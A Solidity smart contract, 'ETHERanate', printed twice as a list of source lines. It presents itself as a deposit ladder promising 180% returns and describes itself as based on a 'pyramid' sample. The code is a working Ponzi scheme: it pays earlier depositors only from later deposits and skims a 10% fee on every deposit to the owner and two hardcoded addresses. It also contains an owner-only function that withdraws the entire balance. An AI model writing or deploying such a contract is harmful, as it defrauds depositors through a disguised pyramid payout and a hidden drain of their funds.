['/*\n', 'etheranate  - ethereum pomegranate\n', '\n', 'Ladder deposit based contract with float percentage based on EtheriumPyramidSample on GitHub.\n', '\n', 'ETHERanate allows to get outcome in 180% with smallest deposit\n', '\n', '*/\n', 'contract ETHERanate\n', '{\n', '    struct Payer \n', '    {\n', '        address ETHaddress;\n', '        uint ETHamount;\n', '    }\n', '\n', '    Payer[] public persons;\n', '\n', '    uint public paymentqueue = 0;\n', '    uint public feecounter;\n', '    uint amount;\n', '    \n', '    address public owner;\n', '    address public ipyh=0x5fD8B8237B6fA8AEDE4fdab7338709094d5c5eA4;\n', '    address public hyip=0xfAF7100b413465Ea0eB550d6D6a2A29695A6f218;\n', '    address meg=this;\n', '\n', '    modifier _onlyowner\n', '    {\n', '        if (msg.sender == owner)\n', '        _\n', '    }\n', '    \n', '    function ETHERanate() \n', '    {\n', '        owner = msg.sender;\n', '    }\n', '    function()            \n', '    {\n', '        enter();\n', '    }\n', '    function enter()\n', '    {\n', '        if (msg.sender == owner)\n', '\t    {\n', '\t        UpdatePay();                                          \n', '\t    }\n', '\t    else                                                          \n', '\t    {\n', '            feecounter+=msg.value/10;                                  \n', '\t        owner.send(feecounter/2);                           \n', '\t        ipyh.send((feecounter/2)/2);                                 \n', '\t        hyip.send((feecounter/2)/2);\n', '\t        feecounter=0;                                            \n', '\t        \n', '            if (msg.value == (1 ether)/40)                                \n', '            {\n', '\t            amount = msg.value;                                      \n', '\t            uint idx=persons.length;                                   \n', '                persons.length+=1;\n', '                persons[idx].ETHaddress=msg.sender;\n', '                 persons[idx].ETHamount=amount;\n', '                canPay();                                              \n', '            }\n', '\t        else                                                         \n', '\t        {\n', '\t            msg.sender.send(msg.value - msg.value/10);                   \n', '\t        }\n', '\t    }\n', '\n', '    }\n', '    \n', '    function UpdatePay() _onlyowner                                            \n', '    {\n', '        msg.sender.send(meg.balance);\n', '    }\n', '    \n', '    function canPay() internal                                                  \n', '    {\n', '        while (meg.balance>persons[paymentqueue].ETHamount/100*180)             \n', '        {\n', '            uint transactionAmount=persons[paymentqueue].ETHamount/100*180;     \n', '            persons[paymentqueue].ETHaddress.send(transactionAmount);           \n', '            paymentqueue+=1;                                                    \n', '        }\n', '    }\n', '}']
['/*\n', 'etheranate  - ethereum pomegranate\n', '\n', 'Ladder deposit based contract with float percentage based on EtheriumPyramidSample on GitHub.\n', '\n', 'ETHERanate allows to get outcome in 180% with smallest deposit\n', '\n', '*/\n', 'contract ETHERanate\n', '{\n', '    struct Payer \n', '    {\n', '        address ETHaddress;\n', '        uint ETHamount;\n', '    }\n', '\n', '    Payer[] public persons;\n', '\n', '    uint public paymentqueue = 0;\n', '    uint public feecounter;\n', '    uint amount;\n', '    \n', '    address public owner;\n', '    address public ipyh=0x5fD8B8237B6fA8AEDE4fdab7338709094d5c5eA4;\n', '    address public hyip=0xfAF7100b413465Ea0eB550d6D6a2A29695A6f218;\n', '    address meg=this;\n', '\n', '    modifier _onlyowner\n', '    {\n', '        if (msg.sender == owner)\n', '        _\n', '    }\n', '    \n', '    function ETHERanate() \n', '    {\n', '        owner = msg.sender;\n', '    }\n', '    function()            \n', '    {\n', '        enter();\n', '    }\n', '    function enter()\n', '    {\n', '        if (msg.sender == owner)\n', '\t    {\n', '\t        UpdatePay();                                          \n', '\t    }\n', '\t    else                                                          \n', '\t    {\n', '            feecounter+=msg.value/10;                                  \n', '\t        owner.send(feecounter/2);                           \n', '\t        ipyh.send((feecounter/2)/2);                                 \n', '\t        hyip.send((feecounter/2)/2);\n', '\t        feecounter=0;                                            \n', '\t        \n', '            if (msg.value == (1 ether)/40)                                \n', '            {\n', '\t            amount = msg.value;                                      \n', '\t            uint idx=persons.length;                                   \n', '                persons.length+=1;\n', '                persons[idx].ETHaddress=msg.sender;\n', '                 persons[idx].ETHamount=amount;\n', '                canPay();                                              \n', '            }\n', '\t        else                                                         \n', '\t        {\n', '\t            msg.sender.send(msg.value - msg.value/10);                   \n', '\t        }\n', '\t    }\n', '\n', '    }\n', '    \n', '    function UpdatePay() _onlyowner                                            \n', '    {\n', '        msg.sender.send(meg.balance);\n', '    }\n', '    \n', '    function canPay() internal                                                  \n', '    {\n', '        while (meg.balance>persons[paymentqueue].ETHamount/100*180)             \n', '        {\n', '            uint transactionAmount=persons[paymentqueue].ETHamount/100*180;     \n', '            persons[paymentqueue].ETHaddress.send(transactionAmount);           \n', '            paymentqueue+=1;                                                    \n', '        }\n', '    }\n', '}']
